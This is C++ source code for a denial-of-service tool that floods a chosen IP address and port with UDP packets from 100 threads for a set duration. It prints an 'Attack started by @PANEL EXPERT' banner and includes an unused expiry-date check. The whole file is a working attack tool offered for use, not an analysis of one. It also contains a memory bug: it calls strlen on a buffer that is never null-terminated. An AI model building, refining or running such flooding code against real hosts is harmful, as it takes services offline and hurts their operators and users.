#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>

#define PACKET_SIZE 15000 * 8
#define PAYLOAD_SIZE 1024 * 8
#define DEFAULT_THREADS 100

std::atomic<bool> attack_running(true);

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
    }
    // buffer[size * 4] = '\0';
}

bool is_expired() {
    int expire_day = 15, expire_month = 11, expire_year = 2024;
    time_t now = time(nullptr);
    auto current = localtime(&now);
    return (current->tm_year + 1900 > expire_year) ||
           (current->tm_year + 1900 == expire_year && current->tm_mon + 1 > expire_month) ||
           (current->tm_year + 1900 == expire_year && current->tm_mon + 1 == expire_month && current->tm_mday > expire_day);
}

void udp_attack(const char *ip, int port, int attack_time) {
    sockaddr_in server_addr{};
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1];

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket error");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::cerr << "Invalid IP: " << ip << std::endl;
        close(sock);
        return;
    }

    time_t start = time(nullptr);
    while (time(nullptr) - start < attack_time) {
        generate_payload(buffer, PAYLOAD_SIZE);
        if (sendto(sock, buffer, strlen(buffer), 0, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send error");
        }
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time>" << std::endl;
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    std::cout << "Attack started by @PANEL EXPERT\n\nIP : " << ip << "\tPORT : " << port << "\tDURATION : " << duration << std::endl;
    std::vector<std::thread> threads;
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        threads.emplace_back(udp_attack, ip, port, duration);
    }

    for (auto &t : threads) {
        t.join();
    }

    return 0;
}
